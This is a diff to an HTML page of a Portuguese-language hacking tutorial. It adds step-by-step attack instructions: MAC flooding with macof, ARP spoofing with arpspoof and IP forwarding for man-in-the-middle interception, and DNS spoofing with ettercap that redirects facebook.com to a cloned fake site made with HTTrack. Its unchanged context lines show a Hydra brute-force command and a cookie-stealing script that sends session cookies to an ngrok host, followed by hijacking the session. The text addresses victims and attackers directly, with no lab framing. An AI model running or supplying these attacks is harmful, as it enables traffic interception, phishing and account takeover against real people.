@@ -264,7 +264,7 @@ proxychains hydra -l nomedousuario -P wordlist.txt http://nomeouipdoalvo.com ssh
 
 <p>Para criar um servidor no nosso computador, basta digitar no terminal <code>python3 -m http.server</code> e utilize o link para acessar esse servidor (como por exemplo, <code>http://0.0.0.0:8000/</code>, no próprio navegador). Ele rodará o servidor a partir da pasta na qual o terminal está. Na mesma pasta, crie um arquivo js para colocar nosso código, que por enquanto será um simples alerta para testar o programa.</p>
 
-<p>PS: Caso você tenha algum bloqueador de anúncios no navegador, desative ele, pois eles bloqueiam esses tipos de scripts, o mesmo vale para extensões como "NoScript".</p>
+<p>PS: Caso você tenha algum bloqueador de anúncios no navegador, desative ele, pois eles bloqueiam esses tipos de scripts, o mesmo vale para extensões como "NoScript". Ele costuma dar outros problemas dependendo das configurações do navegador, nesse caso abra uma janela privada ou tente outro navegador.</p>
 
 <p>Só que esse programa só rodará na nossa rede local, para colocarmos num site externo, precisaremos de uma ferramenta chamada Ngrok. Instale ela no Linux. E vá nesse site e crie uma conta: <a href="https://dashboard.ngrok.com/get-started/your-authtoken" target="_blank">https://dashboard.ngrok.com/get-started/your-authtoken</a></p>
 
@@ -282,7 +282,89 @@ new Image().src = "https://3b42-2804-431-c7e4-3aac-c445-a16a-9c2e-5792.ngrok.io/
 
 <p>Para logar, basta ir nas ferramentas do navegador, e no Armazenamento, basta colocar o valor <q>roubado</q> no cookie PHPSESSIONID e recarregar a página que será logado.</p>
 
-<!-- Carece de correção -->
+<h3>Utilizando os programas do Dsniff</h3>
+
+<p>Um pacote de ferramentas que podemos usar no Kali são os pacotes do Dsniff, que contém vários programas úteis para invasão. Caso não esteja no Kali, baixe as ferramentas digitando <code>sudo apt install dsniff</code>.</p>
+
+<p>Podemos digitar simplesmente (como root), <code>macof</code> no terminal, que fará o switch da sua rede ter sua tabela CAM <q>inundada</q> com MACs aleatórios, de forma que ele funcione como um hub. Não é obrigatório usar esse programa para fazer o ARP Spoofing, mas isso acelerará o processo um pouco em redes que utilizam switches.</p>
+
+<p>Os ataques de ARP Spoofing consistem em adicionar/substituir na tabela ARP da máquina-alvo uma entrada que diz <code>IPDAMÁQUINALVO <===> MACDOATACANTE</code>. Com isso, quando a máquina alvo for montar o pacote para envio ela montará com o IP real do servidor de destino que ela quer acessar, porém utilizará o endereço MAC do atacante, ou seja, quando este pacote passar pelo switch, o mesmo encaminhará o pacote para o atacante, no caso você. Veja um exemplo de uso, na sintaxe <code>arpspoof -i INTERFACE -t IPDOALVO IPQUESEUALVOVAIMAPEARPARASEUMAC</code>:</p>
+
+<pre>
+<code>
+arpspoof -i eth0 -t 192.168.15.3 192.168.15.1 # O segundo IP é do gateway padrão da rede
+</code>
+</pre>
+
+<p>No exemplo acima o IP 192.168.15.3 vai adicionar/atualizar a sua tabela ARP com os novos dados. Para ser 100% funcional é preciso fazer o mesmo para o segundo IP e habilitar o encaminhamento de pacotes na sua máquina, com isso o tráfego entre tais hosts passará por você e você poderá sniffar ou fazer ataques de Man In The Middle. Para isso, abra um terminal e habilite o encaminhamento com esse comando:</p>
+
+<pre>
+<code>
+echo "1">/proc/sys/net/ipv4/ip_forward
+</code>
+</pre>
+
+<p>Agora faça o ARP spoofing, onde o IP final 3, quando se comunicar com o gateway, ele na verdade vai encaminahr os pacotes para o PC do atacante, no caso o seu.</p>
+
+<pre>
+<code>
+arpspoof -i eth0 -t 192.168.15.3 192.168.15.1
+</code>
+</pre>
+
+<p>E em outro terminal, informa que quando o gateway (final 1) se comunicar com o IP 3 na verdade ele irá encaminhar os pacotes para o PC do atacante (ou seu):</p>
+
+<pre>
+<code>
+arpspoof -i eth0 -t 192.168.15.1 192.168.15.3
+</code>
+</pre>
+
+<p>Com isso já seremos capaz de sniffar o tráfego da vítima ou até mesmo fazer um MITM.</p>
+
+<h3>DNS Spoofing com Ettercap</h3>
+
+<p>Caso não esteja no Kali, instale o programa com o comando <code>sudo apt install ettercap-text-only</code>. Para saber mais sobre a versão e outras informações, digite <code>dpkg -l ettercap</code>.</p>
+
+<p>Agora iremos spoofar o DNS da rede, fazendo com que todas as requisições aos sites informados nos navegadores passem por dentro do nosso servidor.</p>
+
+<p>Vamos localizar o arquivo etter.dns, este arquivo irá conter todos os sites que desejamos <q>assumir</q> como sendo o original. A partir disso qualquer navegador que tentar acessar o site configurado dentro do arquivo informado, será redirecionado para a página fake, redirecionando para outra.</p>
+
+<p>Digite esses comandos:</p>
+
+<pre>
+<code>
+updatedb
+
+locate etter.dns
+
+vim /etc/ettercap/etter.dns
+</code>
+</pre>
+
+<p>Para que possamo configurar o etter.dn teremos que entender o funcionamento do arquivo de configuração. A configuração do arquivo é dividido em 3 partes: Nome do endereço, tipo de resource records (RRs) e endereço IP. No nome de endereço iremos definir quais sites serão redirecionados, no resource records vamos coolocar o mapeamento de nome a endereço (no caso, IPv4 usa o A, e IPv6 o AAAA, e o PTR para mapeamento reverso, o mapeamento de um IP para um nome), e no endereço IP colocaremos o IP para o qual redirecionar (no caso onde estará hospedada a página falsa), por exemplo:</p>
+
+<pre>
+<code>
+facebook.com        A      192.168.15.4
+
+*.facebook.com      A      192.168.15.4
+
+www.facebook.com    PTR    192.168.15.4
+</code>
+</pre>
+
+<p>Para iniciar digite no terminal:</p>
+
+<pre>
+<code>
+ettercap -T -q -M arp -i eth0 -P dns_spoof ///
+</code>
+</pre>
+
+<p>Ao executar o comando acima, você irá fazer um spoof na rede toda, assim todos que quiserem acessar o site do Facebook não irão conseguir, daí podemos configurar um site fake para isso.</p>
+
+<p>Podemos clonar um site com a ferramenta HTTrack, digitando no terminal, dentro de uma pasta criada, o comando <code>httrack http://nomedosite.com/</code>.</p>
 
 <ul>
     <li><a href="tudo-sobre-hacking-6.html">Parte Anterior da Matéria!</a></li>
